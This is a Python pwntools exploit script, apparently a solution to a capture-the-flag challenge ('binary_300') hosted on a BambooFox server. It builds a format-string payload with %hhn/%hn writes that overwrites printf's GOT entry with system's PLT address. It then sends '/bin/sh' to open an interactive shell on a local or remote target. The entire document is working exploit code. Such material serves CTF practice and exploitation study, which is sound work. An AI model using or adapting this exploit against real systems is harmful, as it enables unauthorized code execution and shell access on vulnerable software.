#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'debug'

fn = './binary_300'
elf = ELF(fn)

printf_got = elf.got['printf']
system_addr = elf.plt['system'] + 6
assert system_addr == 0x8048416

log.info('printf_got = %s', hex(printf_got))
log.info('system_addr = %s', hex(system_addr))

b0 = system_addr & 0xff
b1 = (system_addr >> 8) & 0xff
w = (system_addr >> 16) & 0xffff

assert b1 > b0 > 0
fmt_len = 40
fmt = '%{b0}c%{o0}$hhn%{b1_b0}c%{o1}$hhn%{w}c%{o2}$hn'.format(
    b0=b0,
    b1_b0=(b1 - b0),
    w=(w - b1),
    o0=(7 + fmt_len // 4),
    o1=(7 + fmt_len // 4 + 1),
    o2=(7 + fmt_len // 4 + 2)
)
assert len(fmt) <= fmt_len

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('bamboofox.cs.nctu.edu.tw', 22003)

payload = ''.join([
    fmt.ljust(fmt_len, '#'),
    p32(printf_got),
    p32(printf_got + 1),
    p32(printf_got + 2),
])

io.sendline(payload)

io.recv(4096, timeout=1)

io.sendline('/bin/sh')

io.interactive()
